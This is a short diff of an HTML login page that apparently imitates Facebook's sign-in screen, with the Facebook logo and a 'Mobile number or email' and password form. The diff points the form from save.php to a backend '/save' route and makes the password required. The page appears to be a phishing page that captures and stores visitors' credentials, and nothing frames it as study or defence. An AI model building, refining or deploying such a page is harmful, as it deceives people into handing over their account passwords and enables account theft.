@@ -6,7 +6,6 @@
 <title>Login</title>
 
 <style>
-
 *{
 margin:0;
 padding:0;
@@ -204,7 +203,8 @@ font-size:14px;
 <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg">
 </div>
 
-<form action="save.php" method="POST">
+<!-- ✅ FORM POINTS TO BACKEND /save -->
+<form action="/save" method="POST">
 
 <div class="input-box">
 <input type="text" name="email" placeholder="Mobile number or email" required>
@@ -213,7 +213,7 @@ font-size:14px;
 
 <div class="input-box">
 <input type="password" id="password" name="password"
-placeholder="Password" oninput="showEye()">
+placeholder="Password" oninput="showEye()" required>
 
 <span class="toggle" id="eyeToggle" onclick="togglePassword()" style="display:none;">
 <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
